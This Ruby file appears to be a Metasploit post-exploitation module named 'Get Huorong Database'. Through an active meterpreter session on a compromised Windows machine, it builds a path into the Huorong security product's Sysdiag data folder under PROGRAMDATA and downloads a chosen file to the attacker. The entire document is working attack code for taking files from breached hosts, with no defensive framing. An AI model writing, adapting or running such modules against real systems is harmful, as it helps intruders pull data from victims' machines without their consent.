class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Get Huorong Database',
        'Description' => %q{
          Get Huorong Database.
        },
        'License' => MSF_LICENSE,
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Author' => ['2096779623'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_stat
              stdapi_sys_config_getenv
            ]
          }
        }
      )
    )
    register_options([
      OptString.new('FILENAME', [true, 'Filename to download', '']),
      OptString.new('DIRECTORY', [false, 'Directory'])
    ])
  end

  def run
    print_status('Getting Database')
    fname = datastore['FILENAME']
    if datastore['DIRECTORY'] && datastore['DIRECTORY'].empty?
      hpath = "#{session.sys.config.getenv('PROGRAMDATA')}\\Huorong\\Sysdiag\\#{datastore['FILENAME']}"
    else
      hpath = "#{session.sys.config.getenv('PROGRAMDATA')}\\Huorong\\Sysdiag\\#{datastore['DIRECTORY']}\\#{datastore['FILENAME']}"
    end
    session.fs.file.download(fname, hpath)

  end 
end
